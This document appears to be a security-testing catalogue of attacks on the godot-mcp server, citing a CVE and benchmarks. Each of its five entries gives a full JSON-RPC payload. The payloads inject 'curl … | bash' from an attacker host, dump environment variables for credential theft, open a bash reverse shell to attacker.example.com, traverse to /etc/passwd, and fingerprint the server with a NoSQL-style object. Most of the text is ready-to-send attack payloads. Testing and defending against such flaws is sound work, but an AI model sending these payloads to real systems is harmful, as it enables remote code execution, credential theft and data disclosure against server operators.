# godot-mcp

## godot-mcp

- **Install:** `npm install -g godot-mcp`
- **Benchmarks/Papers that attacked it:**
  - MCPSecBench (arXiv:2508.13220) — command injection via tool parameters
  - CVE-2026-25546 — command injection via `projectPath` parameter (CVSS critical)
  - MCP-AttackBench (arXiv:2508.10991) — injection & execution family

---

### Attack: Command Injection via projectPath (CVE-2026-25546)

- **Category:** OS command injection (CWE-78)
- **Source:** CVE-2026-25546; MCPSecBench
- **ASR:** Demonstrated in testbed run 2026-04-08 (DAMAGE confirmed on godot server)
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "run_project",
    "arguments": {
      "projectPath": "/tmp/game; curl http://attacker.com/payload | bash #",
      "scene": "Main.tscn"
    }
  }
}
```
- **What it does:** Injects shell metacharacters into the `projectPath` parameter. The server constructs a shell command by interpolating the path directly without sanitization, executing the injected `curl | bash` payload as CVE-2026-25546.
- **Expected server response:** Godot project launch attempt followed by execution of the injected command; attacker receives a connection or command output.

---

### Attack: Command Injection — Environment Dump

- **Category:** OS command injection / credential theft (CWE-78)
- **Source:** CVE-2026-25546; MCPSecBench
- **ASR:** Demonstrated in testbed run 2026-04-08 (9 DAMAGE hits on godot server, 3% ASR)
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "run_project",
    "arguments": {
      "projectPath": ".; id && env > /tmp/env_dump.txt #",
      "scene": "res://Main.tscn"
    }
  }
}
```
- **What it does:** Dumps the server process identity (`id`) and all environment variables to a file, enabling follow-up credential theft. The `#` comments out the remainder of the original command.
- **Expected server response:** Creates `/tmp/env_dump.txt` with full environment; Godot launch may fail but the injection succeeds.

---

### Attack: Command Injection via Script Execution Path

- **Category:** Argument injection / code execution (CWE-88)
- **Source:** CVE-2026-25546; MCP-AttackBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "execute_gdscript",
    "arguments": {
      "script": "import os\nos.system('bash -i >& /dev/tcp/attacker.example.com/4444 0>&1')",
      "projectPath": "/tmp/testproject"
    }
  }
}
```
- **What it does:** Passes Python/GDScript code that calls `os.system` to open a reverse shell. If the Godot server executes script content without sandboxing, this achieves persistent interactive access.
- **Expected server response:** Godot script execution attempt; attacker receives reverse shell connection.

---

### Attack: Path Traversal via Project Path

- **Category:** Path traversal (CWE-22)
- **Source:** CVE-2026-25546; MCPSecBench
- **ASR:** —
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "method": "tools/call",
  "params": {
    "name": "get_project_info",
    "arguments": {
      "projectPath": "../../etc/passwd"
    }
  }
}
```
- **What it does:** Passes a path traversal sequence as the project directory. If the server reads `project.godot` from the specified directory, it will attempt to open `/etc/passwd` as a Godot project file and return an error revealing the file contents.
- **Expected server response:** Error message containing part of `/etc/passwd` content, or a parse error revealing the file was read.

---

### Attack: Behavioral Fingerprinting via list_projects

- **Category:** Technology disclosure (CWE-209)
- **Source:** MCPSecBench; testbed observations
- **ASR:** Demonstrated in testbed (error messages reveal Node.js internal stack)
- **Full JSON-RPC payload:**
```json
{
  "jsonrpc": "2.0",
  "id": 5,
  "method": "tools/call",
  "params": {
    "name": "list_projects",
    "arguments": {
      "searchPath": {"$where": "1==1"}
    }
  }
}
```
- **What it does:** Sends a NoSQL-injection-style object instead of a string path, triggering a `path.includes is not a function` error (observed in testbed). This reveals the server uses Node.js and exposes the internal code path.
- **Expected server response:** `path.includes is not a function` error with stack trace revealing Node.js runtime details.
